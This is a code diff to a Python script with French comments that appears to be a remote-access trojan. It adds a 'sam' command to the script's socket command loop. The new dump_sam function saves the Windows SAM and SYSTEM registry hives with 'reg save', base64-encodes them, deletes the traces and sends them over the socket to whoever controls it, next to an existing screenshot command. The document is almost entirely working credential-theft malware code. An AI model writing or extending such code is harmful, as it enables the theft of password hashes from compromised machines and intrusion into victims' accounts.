@@ -41,6 +41,10 @@ def main():
         if commande == "exit":
             break
 
+        elif commande == "sam":
+            resultat = dump_sam()
+            sock.sendall(resultat.encode())
+
         elif commande == "screenshot":
             resultat = take_screenshot()
             sock.sendall(resultat.encode())
@@ -50,6 +54,29 @@ def main():
             sock.send(resultat.encode())
 
     sock.close()
+
+
+# recupere les fichiers SAM et SYSTEM (faut etre admin)
+def dump_sam():
+    try:
+        subprocess.run(["reg", "save", "HKLM\\SAM", "sam.hive", "/y"],
+                       capture_output=True, check=True)
+        subprocess.run(["reg", "save", "HKLM\\SYSTEM", "system.hive", "/y"],
+                       capture_output=True, check=True)
+
+        with open("sam.hive", "rb") as f:
+            sam = base64.b64encode(f.read()).decode()
+        with open("system.hive", "rb") as f:
+            system = base64.b64encode(f.read()).decode()
+
+        os.remove("sam.hive")
+        os.remove("system.hive")
+        return f"SAM:{sam}\nSYSTEM:{system}"
+    except Exception as e:
+        for fic in ["sam.hive", "system.hive"]:
+            if os.path.exists(fic):
+                os.remove(fic)
+        return f"Erreur SAM: {e}"
 
 
 # prend un screenshot et le renvoie encode en base64
